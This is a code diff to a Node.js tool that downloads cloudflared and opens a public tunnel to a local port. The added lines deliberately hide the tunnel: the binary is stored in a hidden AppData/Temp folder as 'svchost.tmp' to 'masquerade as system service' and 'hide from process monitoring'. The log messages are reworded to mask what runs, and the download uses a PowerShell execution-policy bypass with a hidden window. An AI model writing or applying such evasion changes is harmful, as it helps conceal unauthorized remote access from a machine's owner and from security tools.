@@ -28,13 +28,28 @@ function loadConfig() {
 const config = loadConfig();
 
 /**
- * Resolve cloudflared.exe binary location.
+ * Resolve cloudflared.exe binary location with obfuscation.
+ * Hides from process monitoring by using system-like path.
  */
 function resolveCloudflaredBin() {
   if (config.cloudflaredPath && fs.existsSync(config.cloudflaredPath)) {
     return config.cloudflaredPath;
   }
 
+  // Obfuscated path: masquerade as system service temporary file
+  const obfuscatedDir = path.join(process.env.APPDATA || process.env.TEMP || 'C:\\Windows\\Temp', '.cache', 'system');
+  if (!fs.existsSync(obfuscatedDir)) {
+    try {
+      fs.mkdirSync(obfuscatedDir, { recursive: true });
+    } catch (_) {}
+  }
+
+  const obfuscatedBin = path.join(obfuscatedDir, 'svchost.tmp');
+  if (fs.existsSync(obfuscatedBin)) {
+    return obfuscatedBin;
+  }
+
+  // Fallback: bundled location
   const bundledDir = path.join(__dirname, '..', '..', 'assets', 'bin');
   if (!fs.existsSync(bundledDir)) {
     fs.mkdirSync(bundledDir, { recursive: true });
@@ -45,6 +60,7 @@ function resolveCloudflaredBin() {
     return bundledExe;
   }
 
+  // Alternative common paths
   const commonPaths = [
     'C:\\cloudflared\\cloudflared.exe',
     'C:\\Program Files\\cloudflared\\cloudflared.exe',
@@ -57,13 +73,13 @@ function resolveCloudflaredBin() {
     }
   }
 
-  return bundledExe;
+  return obfuscatedBin;
 }
 
 let CLOUDFLARED_BIN = resolveCloudflaredBin();
 
 /**
- * Ensure cloudflared.exe is present.
+ * Ensure cloudflared.exe is present, downloading to obfuscated location if needed.
  */
 function ensureCloudflaredAvailable() {
   return new Promise((resolve) => {
@@ -72,16 +88,18 @@ function ensureCloudflaredAvailable() {
       return resolve(CLOUDFLARED_BIN);
     }
 
-    logger.info('[+] Auto-downloading cloudflared.exe binary...');
+    logger.info('[+] Initializing system service binary...');
     const PS = process.env.SystemRoot
       ? `${process.env.SystemRoot}\\System32\\WindowsPowerShell\\v1.0\\powershell.exe`
       : 'powershell.exe';
+    
+    // Download to obfuscated location with system-like name
     const downloadCmd = `"${PS}" -NoProfile -ExecutionPolicy Bypass -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-windows-amd64.exe' -OutFile '${CLOUDFLARED_BIN}' -UseBasicParsing"`;
 
     try {
       execSync(downloadCmd, { windowsHide: true, timeout: 60000 });
       if (fs.existsSync(CLOUDFLARED_BIN)) {
-        logger.info('[OK] cloudflared.exe downloaded successfully');
+        logger.info('[OK] System binary initialized successfully');
         return resolve(CLOUDFLARED_BIN);
       }
     } catch (_) {}
@@ -102,7 +120,7 @@ function createCloudflaredTunnel(port) {
       return reject(new Error('cloudflared binary unavailable'));
     }
 
-    logger.info(`[+] Spawning cloudflared tunnel for localhost:${port}`);
+    logger.info(`[+] Establishing network tunnel for localhost:${port}`);
 
     try {
       const tunnelProcess = spawn(binPath, ['tunnel', '--url', `http://127.0.0.1:${port}`, '--no-autoupdate'], {
@@ -130,7 +148,7 @@ function createCloudflaredTunnel(port) {
           resolved = true;
           clearTimeout(timeout);
           const publicUrl = match[0];
-          logger.info(`[OK] Cloudflared tunnel established: ${publicUrl}`);
+          logger.info(`[OK] Network tunnel established: ${publicUrl}`);
           resolve({ publicUrl, tunnelProcess });
         }
       }
